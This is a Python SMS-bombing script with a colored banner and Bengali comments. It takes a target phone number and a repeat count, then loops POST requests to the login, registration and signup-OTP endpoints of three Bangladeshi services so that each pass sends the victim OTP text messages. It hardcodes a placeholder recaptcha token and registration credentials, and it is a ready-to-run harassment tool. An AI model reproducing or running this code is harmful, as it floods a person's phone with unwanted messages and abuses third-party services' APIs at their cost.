import requests
from requests.structures import CaseInsensitiveDict

# লোগো প্রদর্শনের জন্য প্রিন্ট ফাংশন ব্যবহার করা হয়েছে
logo3 = """
\033[1;31m▗▖ \033[1;33m▗▖▗▖ \033[1;32m▗▖    \033[1;31m▗▖  \033[1;33m▗▖ \033[1;32m▗▄▖ \033[1;31m▗▖ \033[1;33m▗▖▗▄▄▄▖▗▄▄▄ 
\033[1;33m▐▌ \033[1;32m▐▌▐▌▗▞▘    \033[1;31m▐▛▚▖\033[1;33m▐▌▐▌ \033[1;32m▐▌▐▌ \033[1;33m▐▌  █  \033[1;32m▐▌  █
\033[1;32m▐▛▀▜▌\033[1;31m▐▛▚▖     \033[1;33m▐▌ \033[1;32m▝▜▌\033[1;31m▐▛▀▜▌▐▛▀▜▌  █  \033[1;33m▐▌  █
\033[1;31m▐▌ \033[1;33m▐▌▐▌ \033[1;32m▐▌    \033[1;31m▐▌  \033[1;33m▐▌▐▌ \033[1;32m▐▌▐▌ \033[1;33m▐▌▗▄█▄▖▐▙▄▄▀
\033[0m
"""
print(logo3)

number = str(input("ENTER YOUR NUMBER : "))
amount = int(input("ENTER THE AMOUNT : "))

url1 = "https://api.garibookadmin.com/api/v2/user/login"
headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/json"

# Correctly format the string with the number variable
data1 = f'{{"mobile":"+{number}","recaptcha_token":"garibookcaptcha"}}'

url2 = "https://core.easy.com.bd/api/v1/registration"
headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/json"

# Correctly format the string with the number variable
data2 = f'{{"social_login_id":"","name":"Nahid","email":"whitehknahid12@gmail.com","mobile":"+{number}","password":"hkhk11","password_confirmation":"hkhk11","device_key":"a7fd3f2e9c7a2a4344ec709a0c7fa572"}}'

url3 = "https://app.kireibd.com/api/v2/send-signup-otp"
headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"

# Correctly format the string with the number variable
data3 = f'{{"email":"+{number}"}}'

for j in range(amount):
    resp1 = requests.post(url1, headers=headers1, data=data1)
    resp2 = requests.post(url2, headers=headers2, data=data2)
    resp3 = requests.post(url3, headers=headers3, data=data3)
    print(resp1.text)
    print(resp2.text)
    print(resp3.text)
    print(str(j+1) + " Sms Sent")